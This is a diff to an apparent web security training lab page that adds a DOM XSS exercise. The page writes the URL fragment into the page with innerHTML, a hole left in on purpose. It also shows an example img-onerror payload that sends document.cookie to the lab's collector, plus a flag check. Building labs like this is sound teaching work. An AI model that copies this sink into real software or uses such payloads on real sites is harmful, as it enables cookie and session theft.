@@ -10,25 +10,38 @@
 <div class="lab-wrap">
   <div class="lab-card">
     <h1>Welcome!</h1>
-    <p>Customize your greeting by adding your name to the URL.</p>
+    <p>Customize your greeting by adding your name to the URL fragment. The value is written with <code>innerHTML</code>.</p>
     <div id="greeting" style="font-size:1.2rem;margin-top:1rem;padding:1rem;border-radius:8px;background:rgba(255,255,255,0.05);"></div>
   </div>
 
   <div class="lab-card">
-    <h2>Quick Links</h2>
-    <ul class="lab-list">
-      <li><a href="#">Dashboard</a></li>
-      <li><a href="#">Settings</a></li>
-      <li><a href="#">Help Center</a></li>
-    </ul>
+    <h2>Proof collector</h2>
+    <p>The page issues a non-HttpOnly proof cookie. Execute script in this origin that sends the cookie to the collector, then verify.</p>
+    <pre class="lab-code"># Example payload appended to the URL:
+&lt;img src=x onerror="fetch('/labs/dom-xss-hash/collect?p='+encodeURIComponent(document.cookie))"&gt;
+# URL:
+/labs/dom-xss-hash#&lt;img src=x onerror="..."&gt;</pre>
+    <button type="button" class="secondary" id="checkDom">Check verification</button>
+    <pre class="lab-code" id="domResult" style="margin-top:0.8rem;">Not checked yet.</pre>
   </div>
-</div>
 
+  <form method="POST" action="/labs/dom-xss-hash/reset"><button type="submit" class="secondary">Reset lab</button></form>
+</div>
 <script>
-  // Client-side personalization from URL fragment
   var name = decodeURIComponent(location.hash.slice(1)) || "visitor";
   document.getElementById("greeting").innerHTML = "Hello, " + name + "! Welcome to WelcomeHub.";
-</script>
 
+  document.getElementById('checkDom').addEventListener('click', async function () {
+    const out = document.getElementById('domResult');
+    try {
+      const response = await fetch('/labs/dom-xss-hash/status');
+      const data = await response.json();
+      out.textContent = JSON.stringify(data, null, 2);
+      if (data.flag) out.textContent += '\n\nFLAG: ' + data.flag;
+    } catch (error) {
+      out.textContent = 'Status check failed: ' + error.message;
+    }
+  });
+</script>
 </body>
 </html>
